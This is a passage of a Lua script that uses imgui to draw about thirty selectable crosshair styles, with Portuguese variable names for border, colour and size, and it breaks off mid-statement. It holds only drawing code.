                imgui.ImVec2(centroX - tamanho - borda, centroY),
                imgui.ImVec2(centroX - metadeTamanho + borda, centroY),
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                largura + borda * 2
            )
            desenho:AddLine(
                imgui.ImVec2(centroX + metadeTamanho - borda, centroY),
                imgui.ImVec2(centroX + tamanho + borda, centroY),
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                largura + borda * 2
            )
            desenho:AddLine(
                imgui.ImVec2(centroX, centroY - tamanho - borda),
                imgui.ImVec2(centroX, centroY - metadeTamanho + borda),
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                largura + borda * 2
            )
            desenho:AddLine(
                imgui.ImVec2(centroX, centroY + metadeTamanho - borda),
                imgui.ImVec2(centroX, centroY + tamanho + borda),
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                largura + borda * 2
            )
        elseif tipo == 2 then
            desenho:AddCircle(
                imgui.ImVec2(centroX, centroY),
                tamanho + borda,
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                0,
                largura + borda * 2
            )
        elseif tipo == 3 then
            local tamanhoQuadrado = tamanho
            desenho:AddRect(
                imgui.ImVec2(centroX - tamanhoQuadrado - borda, centroY - tamanhoQuadrado - borda),
                imgui.ImVec2(centroX + tamanhoQuadrado + borda, centroY + tamanhoQuadrado + borda),
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                0, 0, largura + borda * 2
            )
        elseif tipo == 4 then
            desenho:AddLine(
                imgui.ImVec2(centroX - tamanho - borda, centroY - tamanho - borda),
                imgui.ImVec2(centroX + tamanho + borda, centroY + tamanho + borda),
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                largura + borda * 2
            )
            desenho:AddLine(
                imgui.ImVec2(centroX + tamanho + borda, centroY - tamanho - borda),
                imgui.ImVec2(centroX - tamanho - borda, centroY + tamanho + borda),
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                largura + borda * 2
            )
        elseif tipo == 5 then
            desenho:AddCircleFilled(
                imgui.ImVec2(centroX, centroY),
                (tamanho / 3) + borda,
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4])
            )
        elseif tipo == 6 then
            desenho:AddCircle(
                imgui.ImVec2(centroX, centroY),
                tamanho + borda,
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                0,
                largura + borda * 2
            )
            desenho:AddCircle(
                imgui.ImVec2(centroX, centroY),
                (tamanho / 2) + borda,
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                0,
                largura + borda * 2
            )
            desenho:AddLine(
                imgui.ImVec2(centroX - tamanho - borda, centroY),
                imgui.ImVec2(centroX + tamanho + borda, centroY),
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                largura + borda * 2
            )
            desenho:AddLine(
                imgui.ImVec2(centroX, centroY - tamanho - borda),
                imgui.ImVec2(centroX, centroY + tamanho + borda),
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                largura + borda * 2
            )
        elseif tipo == 7 then
            local pontosDiamante = {
                imgui.ImVec2(centroX, centroY - tamanho - borda),
                imgui.ImVec2(centroX + tamanho + borda, centroY),
                imgui.ImVec2(centroX, centroY + tamanho + borda),
                imgui.ImVec2(centroX - tamanho - borda, centroY)
            }
            for i = 1, 4 do
                local j = i % 4 + 1
                desenho:AddLine(
                    pontosDiamante[i],
                    pontosDiamante[j],
                    rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                    largura + borda * 2
                )
            end
        elseif tipo == 8 then
            local raio = tamanho + borda
            local pontosEstrela = {}
            for i = 1, 5 do
                local angulo = math.rad(i * 144 - 90)
                local x = centroX + math.cos(angulo) * raio
                local y = centroY + math.sin(angulo) * raio
                table.insert(pontosEstrela, imgui.ImVec2(x, y))
            end
            for i = 1, 5 do
                local j = i % 5 + 1
                desenho:AddLine(
                    pontosEstrela[i],
                    pontosEstrela[j],
                    rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                    largura + borda * 2
                )
            end
        elseif tipo == 9 then
            local pontosTriangulo = {
                imgui.ImVec2(centroX, centroY - tamanho - borda),
                imgui.ImVec2(centroX + tamanho + borda, centroY + tamanho + borda),
                imgui.ImVec2(centroX - tamanho - borda, centroY + tamanho + borda)
            }
            for i = 1, 3 do
                local j = i % 3 + 1
                desenho:AddLine(
                    pontosTriangulo[i],
                    pontosTriangulo[j],
                    rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                    largura + borda * 2
                )
            end
        elseif tipo == 10 then
            desenho:AddLine(
                imgui.ImVec2(centroX - tamanho - borda, centroY),
                imgui.ImVec2(centroX + tamanho + borda, centroY),
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                1 + borda * 2
            )
            desenho:AddLine(
                imgui.ImVec2(centroX, centroY - tamanho - borda),
                imgui.ImVec2(centroX, centroY + tamanho + borda),
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                1 + borda * 2
            )
        elseif tipo == 11 then
            desenho:AddLine(
                imgui.ImVec2(centroX - tamanho - borda, centroY),
                imgui.ImVec2(centroX + tamanho + borda, centroY),
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                5 + borda * 2
            )
            desenho:AddLine(
                imgui.ImVec2(centroX, centroY - tamanho - borda),
                imgui.ImVec2(centroX, centroY + tamanho + borda),
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                5 + borda * 2
            )
        elseif tipo == 12 then
            desenho:AddCircle(
                imgui.ImVec2(centroX, centroY),
                tamanho + borda,
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                0,
                largura + borda * 2
            )
            desenho:AddCircle(
                imgui.ImVec2(centroX, centroY),
                (tamanho / 2) + borda,
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                0,
                largura + borda * 2
            )
        elseif tipo == 13 then
            local tamanhoQuadrado = tamanho
            desenho:AddRect(
                imgui.ImVec2(centroX - tamanhoQuadrado - borda, centroY - tamanhoQuadrado - borda),
                imgui.ImVec2(centroX + tamanhoQuadrado + borda, centroY + tamanhoQuadrado + borda),
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                0, 0, largura + borda * 2
            )
        elseif tipo == 14 then
            desenho:AddLine(
                imgui.ImVec2(centroX - tamanho - borda, centroY - tamanho - borda),
                imgui.ImVec2(centroX + tamanho + borda, centroY + tamanho + borda),
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                largura + borda * 2
            )
            desenho:AddLine(
                imgui.ImVec2(centroX + tamanho + borda, centroY - tamanho - borda),
                imgui.ImVec2(centroX - tamanho - borda, centroY + tamanho + borda),
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                largura + borda * 2
            )
            desenho:AddCircleFilled(
                imgui.ImVec2(centroX, centroY),
                (tamanho / 4) + borda,
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4])
            )
        elseif tipo == 15 then
            desenho:AddCircle(
                imgui.ImVec2(centroX, centroY),
                tamanho + borda,
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                0,
                largura + borda * 2
            )
            desenho:AddLine(
                imgui.ImVec2(centroX - tamanho - borda, centroY),
                imgui.ImVec2(centroX - (tamanho / 2) + borda, centroY),
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                largura + borda * 2
            )
            desenho:AddLine(
                imgui.ImVec2(centroX + (tamanho / 2) - borda, centroY),
                imgui.ImVec2(centroX + tamanho + borda, centroY),
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                largura + borda * 2
            )
            desenho:AddLine(
                imgui.ImVec2(centroX, centroY - tamanho - borda),
                imgui.ImVec2(centroX, centroY - (tamanho / 2) + borda),
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                largura + borda * 2
            )
            desenho:AddLine(
                imgui.ImVec2(centroX, centroY + (tamanho / 2) - borda),
                imgui.ImVec2(centroX, centroY + tamanho + borda),
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                largura + borda * 2
            )
        elseif tipo == 16 then
            local pontosDiamante = {
                imgui.ImVec2(centroX, centroY - tamanho - borda),
                imgui.ImVec2(centroX + tamanho + borda, centroY),
                imgui.ImVec2(centroX, centroY + tamanho + borda),
                imgui.ImVec2(centroX - tamanho - borda, centroY)
            }
            for i = 1, 4 do
                local j = i % 4 + 1
                desenho:AddLine(
                    pontosDiamante[i],
                    pontosDiamante[j],
                    rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                    largura + borda * 2
                )
            end
        elseif tipo == 17 then
            local raio = tamanho + borda
            local pontosEstrela = {}
            for i = 1, 6 do
                local angulo = math.rad(i * 60 - 90)
                local x = centroX + math.cos(angulo) * raio
                local y = centroY + math.sin(angulo) * raio
                table.insert(pontosEstrela, imgui.ImVec2(x, y))
            end
            for i = 1, 6 do
                local j = i % 6 + 1
                desenho:AddLine(
                    pontosEstrela[i],
                    pontosEstrela[j],
                    rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                    largura + borda * 2
                )
            end
        elseif tipo == 18 then
            local pontosTriangulo = {
                imgui.ImVec2(centroX, centroY + tamanho + borda),
                imgui.ImVec2(centroX + tamanho + borda, centroY - tamanho - borda),
                imgui.ImVec2(centroX - tamanho - borda, centroY - tamanho - borda)
            }
            for i = 1, 3 do
                local j = i % 3 + 1
                desenho:AddLine(
                    pontosTriangulo[i],
                    pontosTriangulo[j],
                    rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                    largura + borda * 2
                )
            end
        elseif tipo == 19 then
            desenho:AddLine(
                imgui.ImVec2(centroX - tamanho - borda, centroY),
                imgui.ImVec2(centroX + tamanho + borda, centroY),
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                largura + borda * 2
            )
            desenho:AddLine(
                imgui.ImVec2(centroX, centroY - tamanho - borda),
                imgui.ImVec2(centroX, centroY + tamanho + borda),
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                largura + borda * 2
            )
            desenho:AddLine(
                imgui.ImVec2(centroX - tamanho / 2 - borda, centroY - tamanho / 2 - borda),
                imgui.ImVec2(centroX + tamanho / 2 + borda, centroY + tamanho / 2 + borda),
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                largura + borda * 2
            )
            desenho:AddLine(
                imgui.ImVec2(centroX + tamanho / 2 + borda, centroY - tamanho / 2 - borda),
                imgui.ImVec2(centroX - tamanho / 2 - borda, centroY + tamanho / 2 + borda),
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                largura + borda * 2
            )
        elseif tipo == 20 then
            desenho:AddCircle(
                imgui.ImVec2(centroX, centroY),
                tamanho + borda,
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                0,
                largura + borda * 2
            )
            desenho:AddLine(
                imgui.ImVec2(centroX - tamanho - borda, centroY),
                imgui.ImVec2(centroX - (tamanho / 2) + borda, centroY),
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                largura + borda * 2
            )
            desenho:AddLine(
                imgui.ImVec2(centroX + (tamanho / 2) - borda, centroY),
                imgui.ImVec2(centroX + tamanho + borda, centroY),
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                largura + borda * 2
            )
            desenho:AddLine(
                imgui.ImVec2(centroX, centroY - tamanho - borda),
                imgui.ImVec2(centroX, centroY - (tamanho / 2) + borda),
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                largura + borda * 2
            )
            desenho:AddLine(
                imgui.ImVec2(centroX, centroY + (tamanho / 2) - borda),
                imgui.ImVec2(centroX, centroY + tamanho + borda),
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                largura + borda * 2
            )
            desenho:AddCircle(
                imgui.ImVec2(centroX, centroY),
                (tamanho / 4) + borda,
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                0,
                largura + borda * 2
            )
        elseif tipo == 21 then
            desenho:AddCircleFilled(
                imgui.ImVec2(centroX, centroY),
                (tamanho / 4) + borda,
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4])
            )
            desenho:AddCircle(
                imgui.ImVec2(centroX, centroY),
                (tamanho / 2) + borda,
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                0,
                largura + borda * 2
            )
        elseif tipo == 22 then
            desenho:AddCircle(
                imgui.ImVec2(centroX, centroY),
                tamanho + borda,
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                0,
                largura + borda * 2
            )
            desenho:AddLine(
                imgui.ImVec2(centroX - tamanho - borda, centroY),
                imgui.ImVec2(centroX + tamanho + borda, centroY),
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                largura + borda * 2
            )
            desenho:AddLine(
                imgui.ImVec2(centroX, centroY - tamanho - borda),
                imgui.ImVec2(centroX, centroY + tamanho + borda),
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                largura + borda * 2
            )
        elseif tipo == 23 then
            local tamanhoQuadrado = tamanho
            desenho:AddRect(
                imgui.ImVec2(centroX - tamanhoQuadrado - borda, centroY - tamanhoQuadrado - borda),
                imgui.ImVec2(centroX + tamanhoQuadrado + borda, centroY + tamanhoQuadrado + borda),
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                0, 0, largura + borda * 2
            )
            desenho:AddLine(
                imgui.ImVec2(centroX - tamanhoQuadrado - borda, centroY),
                imgui.ImVec2(centroX + tamanhoQuadrado + borda, centroY),
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                largura + borda * 2
            )
            desenho:AddLine(
                imgui.ImVec2(centroX, centroY - tamanhoQuadrado - borda),
                imgui.ImVec2(centroX, centroY + tamanhoQuadrado + borda),
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                largura + borda * 2
            )
        elseif tipo == 24 then
            desenho:AddLine(
                imgui.ImVec2(centroX - tamanho - borda, centroY - tamanho - borda),
                imgui.ImVec2(centroX + tamanho + borda, centroY + tamanho + borda),
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                largura + borda * 2
            )
            desenho:AddLine(
                imgui.ImVec2(centroX + tamanho + borda, centroY - tamanho - borda),
                imgui.ImVec2(centroX - tamanho - borda, centroY + tamanho + borda),
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                largura + borda * 2
            )
            desenho:AddCircle(
                imgui.ImVec2(centroX, centroY),
                tamanho + borda,
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                0,
                largura + borda * 2
            )
        elseif tipo == 25 then
            local raio = tamanho + borda
            local pontosHexagono = {}
            for i = 1, 6 do
                local angulo = math.rad(i * 60 - 90)
                local x = centroX + math.cos(angulo) * raio
                local y = centroY + math.sin(angulo) * raio
                table.insert(pontosHexagono, imgui.ImVec2(x, y))
            end
            for i = 1, 6 do
                local j = i % 6 + 1
                desenho:AddLine(
                    pontosHexagono[i],
                    pontosHexagono[j],
                    rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                    largura + borda * 2
                )
            end
        elseif tipo == 26 then
            local raio = tamanho + borda
            local pontosOctogono = {}
            for i = 1, 8 do
                local angulo = math.rad(i * 45 - 90)
                local x = centroX + math.cos(angulo) * raio
                local y = centroY + math.sin(angulo) * raio
                table.insert(pontosOctogono, imgui.ImVec2(x, y))
            end
            for i = 1, 8 do
                local j = i % 8 + 1
                desenho:AddLine(
                    pontosOctogono[i],
                    pontosOctogono[j],
                    rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                    largura + borda * 2
                )
            end
        elseif tipo == 27 then
            desenho:AddCircle(
                imgui.ImVec2(centroX, centroY),
                tamanho + borda,
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                0,
                largura + borda * 2
            )
            for i = 0, 7 do
                local angulo = math.rad(i * 45)
                local x1 = centroX + math.cos(angulo) * (tamanho + borda)
                local y1 = centroY + math.sin(angulo) * (tamanho + borda)
                local x2 = centroX + math.cos(angulo) * (tamanho / 2 + borda)
                local y2 = centroY + math.sin(angulo) * (tamanho / 2 + borda)
                desenho:AddLine(
                    imgui.ImVec2(x1, y1),
                    imgui.ImVec2(x2, y2),
                    rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                    largura + borda * 2
                )
            end
        elseif tipo == 28 then
            desenho:AddLine(
                imgui.ImVec2(centroX - tamanho - borda, centroY),
                imgui.ImVec2(centroX - (tamanho / 2) + borda, centroY),
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                largura + borda * 2
            )
            desenho:AddLine(
                imgui.ImVec2(centroX + (tamanho / 2) - borda, centroY),
                imgui.ImVec2(centroX + tamanho + borda, centroY),
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                largura + borda * 2
            )
            desenho:AddLine(
                imgui.ImVec2(centroX, centroY - tamanho - borda),
                imgui.ImVec2(centroX, centroY - (tamanho / 2) + borda),
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                largura + borda * 2
            )
            desenho:AddLine(
                imgui.ImVec2(centroX, centroY + (tamanho / 2) - borda),
                imgui.ImVec2(centroX, centroY + tamanho + borda),
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                largura + borda * 2
            )
            desenho:AddLine(
                imgui.ImVec2(centroX - tamanho / 2 - borda, centroY - tamanho / 2 - borda),
                imgui.ImVec2(centroX + tamanho / 2 + borda, centroY + tamanho / 2 + borda),
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                largura + borda * 2
            )
            desenho:AddLine(
                imgui.ImVec2(centroX + tamanho / 2 + borda, centroY - tamanho / 2 - borda),
                imgui.ImVec2(centroX - tamanho / 2 - borda, centroY + tamanho / 2 + borda),
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                largura + borda * 2
            )
        elseif tipo == 29 then
            desenho:AddCircle(
                imgui.ImVec2(centroX, centroY),
                tamanho + borda,
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                0,
                largura + borda * 2
            )
            desenho:AddCircle(
                imgui.ImVec2(centroX, centroY),
                (tamanho / 2) + borda,
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                0,
                largura + borda * 2
            )
            desenho:AddCircle(
                imgui.ImVec2(centroX, centroY),
                (tamanho / 4) + borda,
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                0,
                largura + borda * 2
            )
            desenho:AddLine(
                imgui.ImVec2(centroX - tamanho - borda, centroY),
                imgui.ImVec2(centroX + tamanho + borda, centroY),
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                largura + borda * 2
            )
            desenho:AddLine(
                imgui.ImVec2(centroX, centroY - tamanho - borda),
                imgui.ImVec2(centroX, centroY + tamanho + borda),
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                largura + borda * 2
            )
        end
    end
    if tipo == 0 then
        desenho:AddLine(
            imgui.ImVec2(centroX - tamanho, centroY),
            imgui.ImVec2(centroX + tamanho, centroY),
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            largura
        )
        desenho:AddLine(
            imgui.ImVec2(centroX, centroY - tamanho),
            imgui.ImVec2(centroX, centroY + tamanho),
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            largura
        )
    elseif tipo == 1 then
        desenho:AddLine(
            imgui.ImVec2(centroX - tamanho, centroY),
            imgui.ImVec2(centroX - metadeTamanho, centroY),
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            largura
        )
        desenho:AddLine(
            imgui.ImVec2(centroX + metadeTamanho, centroY),
            imgui.ImVec2(centroX + tamanho, centroY),
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            largura
        )
        desenho:AddLine(
            imgui.ImVec2(centroX, centroY - tamanho),
            imgui.ImVec2(centroX, centroY - metadeTamanho),
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            largura
        )
        desenho:AddLine(
            imgui.ImVec2(centroX, centroY + metadeTamanho),
            imgui.ImVec2(centroX, centroY + tamanho),
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            largura
        )
    elseif tipo == 2 then
        desenho:AddCircle(
            imgui.ImVec2(centroX, centroY),
            tamanho,
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            0,
            largura
        )
    elseif tipo == 3 then
        local tamanhoQuadrado = tamanho
        desenho:AddRect(
            imgui.ImVec2(centroX - tamanhoQuadrado, centroY - tamanhoQuadrado),
            imgui.ImVec2(centroX + tamanhoQuadrado, centroY + tamanhoQuadrado),
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            0, 0, largura
        )
    elseif tipo == 4 then
        desenho:AddLine(
            imgui.ImVec2(centroX - tamanho, centroY - tamanho),
            imgui.ImVec2(centroX + tamanho, centroY + tamanho),
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            largura
        )
        desenho:AddLine(
            imgui.ImVec2(centroX + tamanho, centroY - tamanho),
            imgui.ImVec2(centroX - tamanho, centroY + tamanho),
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            largura
        )
    elseif tipo == 5 then
        desenho:AddCircleFilled(
            imgui.ImVec2(centroX, centroY),
            tamanho / 3,
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4])
        )
    elseif tipo == 6 then
        desenho:AddCircle(
            imgui.ImVec2(centroX, centroY),
            tamanho,
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            0,
            largura
        )
        desenho:AddCircle(
            imgui.ImVec2(centroX, centroY),
            tamanho / 2,
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            0,
            largura
        )
        desenho:AddLine(
            imgui.ImVec2(centroX - tamanho, centroY),
            imgui.ImVec2(centroX + tamanho, centroY),
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            largura
        )
        desenho:AddLine(
            imgui.ImVec2(centroX, centroY - tamanho),
            imgui.ImVec2(centroX, centroY + tamanho),
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            largura
        )
    elseif tipo == 7 then
        local pontosDiamante = {
            imgui.ImVec2(centroX, centroY - tamanho),
            imgui.ImVec2(centroX + tamanho, centroY),
            imgui.ImVec2(centroX, centroY + tamanho),
            imgui.ImVec2(centroX - tamanho, centroY)
        }
        for i = 1, 4 do
            local j = i % 4 + 1
            desenho:AddLine(
                pontosDiamante[i],
                pontosDiamante[j],
                rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
                largura
            )
        end
    elseif tipo == 8 then
        local raio = tamanho
        local pontosEstrela = {}
        for i = 1, 5 do
            local angulo = math.rad(i * 144 - 90)
            local x = centroX + math.cos(angulo) * raio
            local y = centroY + math.sin(angulo) * raio
            table.insert(pontosEstrela, imgui.ImVec2(x, y))
        end
        for i = 1, 5 do
            local j = i % 5 + 1
            desenho:AddLine(
                pontosEstrela[i],
                pontosEstrela[j],
                rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
                largura
            )
        end
    elseif tipo == 9 then
        local pontosTriangulo = {
            imgui.ImVec2(centroX, centroY - tamanho),
            imgui.ImVec2(centroX + tamanho, centroY + tamanho),
            imgui.ImVec2(centroX - tamanho, centroY + tamanho)
        }
        for i = 1, 3 do
            local j = i % 3 + 1
            desenho:AddLine(
                pontosTriangulo[i],
                pontosTriangulo[j],
                rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
                largura
            )
        end
    elseif tipo == 10 then
        desenho:AddLine(
            imgui.ImVec2(centroX - tamanho, centroY),
            imgui.ImVec2(centroX + tamanho, centroY),
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            1
        )
        desenho:AddLine(
            imgui.ImVec2(centroX, centroY - tamanho),
            imgui.ImVec2(centroX, centroY + tamanho),
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            1
        )
    elseif tipo == 11 then
        desenho:AddLine(
            imgui.ImVec2(centroX - tamanho, centroY),
            imgui.ImVec2(centroX + tamanho, centroY),
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            5
        )
        desenho:AddLine(
            imgui.ImVec2(centroX, centroY - tamanho),
            imgui.ImVec2(centroX, centroY + tamanho),
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            5
        )
    elseif tipo == 12 then
        desenho:AddCircle(
            imgui.ImVec2(centroX, centroY),
            tamanho,
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            0,
            largura
        )
        desenho:AddCircle(
            imgui.ImVec2(centroX, centroY),
            tamanho / 2,
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            0,
            largura
        )
    elseif tipo == 13 then
        local tamanhoQuadrado = tamanho
        desenho:AddRect(
            imgui.ImVec2(centroX - tamanhoQuadrado, centroY - tamanhoQuadrado),
            imgui.ImVec2(centroX + tamanhoQuadrado, centroY + tamanhoQuadrado),
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            0, 0, largura
        )
    elseif tipo == 14 then
        desenho:AddLine(
            imgui.ImVec2(centroX - tamanho, centroY - tamanho),
            imgui.ImVec2(centroX + tamanho, centroY + tamanho),
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            largura
        )
        desenho:AddLine(
            imgui.ImVec2(centroX + tamanho, centroY - tamanho),
            imgui.ImVec2(centroX - tamanho, centroY + tamanho),
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            largura
        )
        desenho:AddCircleFilled(
            imgui.ImVec2(centroX, centroY),
            tamanho / 4,
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4])
        )
    elseif tipo == 15 then
        desenho:AddCircle(
            imgui.ImVec2(centroX, centroY),
            tamanho,
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            0,
            largura
        )
        desenho:AddLine(
            imgui.ImVec2(centroX - tamanho, centroY),
            imgui.ImVec2(centroX - tamanho / 2, centroY),
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            largura
        )
        desenho:AddLine(
            imgui.ImVec2(centroX + tamanho / 2, centroY),
            imgui.ImVec2(centroX + tamanho, centroY),
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            largura
        )
        desenho:AddLine(
            imgui.ImVec2(centroX, centroY - tamanho),
            imgui.ImVec2(centroX, centroY - tamanho / 2),
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            largura
        )
        desenho:AddLine(
            imgui.ImVec2(centroX, centroY + tamanho / 2),
            imgui.ImVec2(centroX, centroY + tamanho),
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            largura
        )
    elseif tipo == 16 then
        local pontosDiamante = {
